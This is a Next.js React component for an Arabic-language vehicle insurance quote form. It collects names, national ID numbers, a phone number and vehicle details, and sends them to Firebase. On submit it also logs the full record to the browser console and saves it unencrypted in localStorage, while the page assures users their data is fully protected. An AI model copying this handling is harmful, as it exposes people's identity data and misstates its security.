"use client"

import type React from "react"
import { useState } from "react"
import { useRouter } from "next/navigation"
import { motion, AnimatePresence } from "framer-motion"
import { Shield, FileText, CheckCircle, ArrowRight, AlertCircle } from "lucide-react"
import InsurancePurpose from "./InsurancePurpose"
import { addData } from "@/lib/firebase"
import type { FormErrors, InsuranceFormData } from "@/lib/types/insurance"
import VehicleRegistration from "../Vaicle-reg"
import LoadingOverlay from "../Loader"
import { validateInsuranceForm } from "@/lib/validation"

const InsuranceFormContainer: React.FC = () => {
  const router = useRouter()
  const [isLoading, setIsLoading] = useState(false)
  const [isSubmitting, setIsSubmitting] = useState(false)

  const getInitialFormData = (): InsuranceFormData => {
    return {
      insurance_purpose: "renewal",
      vehicle_type: "registration",
      agreeToTerms: false,
      documment_owner_full_name: "",
      owner_identity_number: "",
      buyer_identity_number: "",
      seller_identity_number: "",
      phone: "",
      serial_number: "",
      vehicle_manufacture_number: "",
      customs_code: "",
    }
  }

  const [formData, setFormData] = useState<InsuranceFormData>(getInitialFormData())
  const [errors, setErrors] = useState<FormErrors>({})

  const handleSubmit = async (event: React.FormEvent) => {
    event.preventDefault()

    const validationErrors = validateInsuranceForm(formData)
    if (Object.keys(validationErrors as any).length > 0) {
      setErrors(validationErrors as any)
      window.scrollTo({ top: 0, behavior: "smooth" })
      return
    }

    setIsSubmitting(true)
    setIsLoading(true)

    try {
      await new Promise((resolve) => setTimeout(resolve, 1500))

      // Generate a visitor ID if it doesn't exist
      let visitorId = localStorage.getItem("visitor")
      if (!visitorId) {
        visitorId = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15)
        localStorage.setItem("visitor", visitorId)
      }

      // Add data to Firestore
      await addData({ id: visitorId, ...formData })

      // Store form data in localStorage
      localStorage.setItem("insuranceFormData", JSON.stringify(formData))

      console.log("Form submitted:", formData)
      router.push("/insurance-details")
    } finally {
      setIsLoading(false)
      setIsSubmitting(false)
    }
  }

  const setFormDataWithConstraints = (
    updater: ((prev: InsuranceFormData) => InsuranceFormData) | InsuranceFormData,
  ) => {
    setFormData((prev) => {
      const newData = typeof updater === "function" ? updater(prev) : updater

      if (newData.insurance_purpose === "property-transfer") {
        newData.vehicle_type = "registration"
      }

      return newData
    })
  }

  // Calculate form completion percentage
  const calculateProgress = () => {
    const requiredFields = [
      "documment_owner_full_name",
      "owner_identity_number",
      "phone",
      "serial_number",
      "vehicle_manufacture_number",
    ]

    const completedFields = requiredFields.filter(
      (field) =>
        formData[field as keyof InsuranceFormData] && String(formData[field as keyof InsuranceFormData]).trim() !== "",
    ).length

    return Math.round((completedFields / requiredFields.length) * 100)
  }

  const progress = calculateProgress()

  return (
    <>
      <LoadingOverlay isVisible={isLoading} />

      <motion.div
        initial={{ opacity: 0, y: 50 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.8, ease: [0.25, 0.46, 0.45, 0.94] }}
        className="px-4 -mt-24 relative z-20"
      >
        <div className="container mx-auto max-w-6xl">
          {/* Form Header */}
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.6, delay: 0.2 }}
            className="text-center mb-8"
          >
            <div className="inline-flex items-center gap-3 bg-gradient-to-r from-blue-600 to-cyan-600 text-white px-6 py-3 rounded-full shadow-lg mb-4">
              <Shield className="w-5 h-5" />
              <span className="font-semibold">احصل على عرض أسعار فوري</span>
            </div>
            <h2 className="text-3xl md:text-4xl font-bold text-gray-800 mb-2">ابدأ رحلة التأمين الخاصة بك</h2>
            <p className="text-gray-600 text-lg">املأ البيانات المطلوبة للحصول على أفضل عروض التأمين</p>
          </motion.div>

          {/* Progress Bar */}
          <motion.div
            initial={{ opacity: 0, scaleX: 0 }}
            animate={{ opacity: 1, scaleX: 1 }}
            transition={{ duration: 0.8, delay: 0.4 }}
            className="mb-8"
          >
            <div className="bg-white rounded-2xl p-6 shadow-lg border border-gray-100">
              <div className="flex items-center justify-between mb-3">
                <span className="text-sm font-medium text-gray-600">مستوى اكتمال النموذج</span>
                <span className="text-sm font-bold text-blue-600">{progress}%</span>
              </div>
              <div className="w-full bg-gray-200 rounded-full h-3 overflow-hidden">
                <motion.div
                  className="h-full bg-gradient-to-r from-blue-500 to-cyan-500 rounded-full"
                  initial={{ width: 0 }}
                  animate={{ width: `${progress}%` }}
                  transition={{ duration: 0.8, ease: "easeOut" }}
                />
              </div>
            </div>
          </motion.div>

          {/* Main Form */}
          <motion.div
            initial={{ opacity: 0, y: 30 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.8, delay: 0.3 }}
            className="bg-white rounded-3xl shadow-2xl border border-gray-100 overflow-hidden"
          >
            {/* Form Header with Icons */}
            <div className="bg-gradient-to-r from-gray-50 to-blue-50 px-6 md:px-10 py-6 border-b border-gray-200">
              <div className="flex items-center gap-4">
                <div className="flex items-center gap-2">
                  <div className="w-10 h-10 bg-blue-100 rounded-full flex items-center justify-center">
                    <FileText className="w-5 h-5 text-blue-600" />
                  </div>
                  <span className="font-semibold text-gray-800">بيانات التأمين</span>
                </div>
                <div className="hidden md:flex items-center gap-2 text-sm text-gray-500">
                  <div className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></div>
                  <span>آمن ومحمي</span>
                </div>
              </div>
            </div>

            <form onSubmit={handleSubmit} className="p-6 md:p-10">
              {/* Error Summary */}
              <AnimatePresence>
                {Object.keys(errors).length > 0 && (
                  <motion.div
                    initial={{ opacity: 0, height: 0 }}
                    animate={{ opacity: 1, height: "auto" }}
                    exit={{ opacity: 0, height: 0 }}
                    className="mb-6 p-4 bg-red-50 border border-red-200 rounded-xl"
                  >
                    <div className="flex items-center gap-2 text-red-700 mb-2">
                      <AlertCircle className="w-5 h-5" />
                      <span className="font-semibold">يرجى تصحيح الأخطاء التالية:</span>
                    </div>
                    <ul className="text-sm text-red-600 space-y-1">
                      {Object.values(errors).map((error, index) => (
                        <li key={index} className="flex items-center gap-2">
                          <div className="w-1 h-1 bg-red-400 rounded-full"></div>
                          {error}
                        </li>
                      ))}
                    </ul>
                  </motion.div>
                )}
              </AnimatePresence>

              {/* Form Sections */}
              <div className="grid grid-cols-1 lg:grid-cols-2 gap-8 md:gap-12">
                <motion.div
                  initial={{ opacity: 0, x: -30 }}
                  animate={{ opacity: 1, x: 0 }}
                  transition={{ duration: 0.6, delay: 0.4 }}
                  className="space-y-6"
                >
                  <div className="flex items-center gap-3 mb-4">
                    <div className="w-8 h-8 bg-blue-100 rounded-full flex items-center justify-center text-blue-600 font-bold text-sm">
                      1
                    </div>
                    <h3 className="text-xl font-bold text-gray-800">غرض التأمين</h3>
                  </div>
                  <InsurancePurpose formData={formData} setFormData={setFormDataWithConstraints} errors={errors} />
                </motion.div>

                <motion.div
                  initial={{ opacity: 0, x: 30 }}
                  animate={{ opacity: 1, x: 0 }}
                  transition={{ duration: 0.6, delay: 0.5 }}
                  className="space-y-6"
                >
                  <div className="flex items-center gap-3 mb-4">
                    <div className="w-8 h-8 bg-cyan-100 rounded-full flex items-center justify-center text-cyan-600 font-bold text-sm">
                      2
                    </div>
                    <h3 className="text-xl font-bold text-gray-800">بيانات المركبة</h3>
                  </div>
                  <VehicleRegistration
                    formData={formData}
                    setFormData={setFormDataWithConstraints}
                    errors={errors}
                    disabled={formData.insurance_purpose === "property-transfer"}
                  />
                </motion.div>
              </div>

              {/* Form Footer */}
              <motion.div
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ duration: 0.6, delay: 0.6 }}
                className="mt-10 pt-8 border-t-2 border-gray-100"
              >
                <div className="bg-gradient-to-r from-gray-50 to-blue-50 rounded-2xl p-6">
                  <div className="flex flex-col lg:flex-row items-center justify-between gap-6">
                    {/* Terms Checkbox */}
                    <motion.label whileHover={{ scale: 1.02 }} className="flex items-center gap-3 cursor-pointer group">
                      <div className="relative">
                        <input
                          type="checkbox"
                          checked={formData.agreeToTerms}
                          onChange={(e) =>
                            setFormDataWithConstraints((prev) => ({
                              ...prev,
                              agreeToTerms: e.target.checked,
                            }))
                          }
                          className="sr-only"
                        />
                        <div
                          className={`w-6 h-6 rounded-lg border-2 transition-all duration-200 ${
                            formData.agreeToTerms
                              ? "bg-blue-600 border-blue-600"
                              : "border-gray-300 group-hover:border-blue-400"
                          }`}
                        >
                          {formData.agreeToTerms && <CheckCircle className="w-6 h-6 text-white" />}
                        </div>
                      </div>
                      <span className="text-gray-700 font-medium">
                        أوافق على منح حق الاستعلام وأقر بصحة البيانات المدخلة
                      </span>
                    </motion.label>

                    {/* Submit Button */}
                    <motion.button
                      whileHover={{ scale: 1.05, y: -2 }}
                      whileTap={{ scale: 0.95 }}
                      type="submit"
                      disabled={isSubmitting}
                      className="group relative inline-flex items-center gap-3 bg-gradient-to-r from-blue-600 to-cyan-600 hover:from-blue-700 hover:to-cyan-700 text-white font-bold py-4 px-8 rounded-xl shadow-lg hover:shadow-xl transition-all duration-300 focus:outline-none focus:ring-4 focus:ring-blue-300 disabled:opacity-50 disabled:cursor-not-allowed min-w-[200px] justify-center"
                    >
                      {isSubmitting ? (
                        <>
                          <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                          <span>جاري المعالجة...</span>
                        </>
                      ) : (
                        <>
                          <span className="text-lg">احصل على العروض</span>
                          <motion.div
                            animate={{ x: [0, 4, 0] }}
                            transition={{ duration: 1.5, repeat: Number.POSITIVE_INFINITY }}
                          >
                            <ArrowRight className="w-5 h-5 rotate-180" />
                          </motion.div>
                        </>
                      )}
                    </motion.button>
                  </div>

                  {/* Terms Error */}
                  <AnimatePresence>
                    {errors.agreeToTerms && (
                      <motion.div
                        initial={{ opacity: 0, height: 0 }}
                        animate={{ opacity: 1, height: "auto" }}
                        exit={{ opacity: 0, height: 0 }}
                        className="mt-4 flex items-center gap-2 text-red-600"
                      >
                        <AlertCircle className="w-4 h-4" />
                        <p className="text-sm font-medium">{errors.agreeToTerms}</p>
                      </motion.div>
                    )}
                  </AnimatePresence>
                </div>
              </motion.div>

              {/* Security Notice */}
              <motion.div
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                transition={{ duration: 0.6, delay: 0.8 }}
                className="mt-6 text-center"
              >
                <div className="inline-flex items-center gap-2 text-sm text-gray-500">
                  <Shield className="w-4 h-4" />
                  <span>بياناتك محمية بأعلى معايير الأمان والخصوصية</span>
                </div>
              </motion.div>
            </form>
          </motion.div>
        </div>
      </motion.div>
    </>
  )
}

export default InsuranceFormContainer
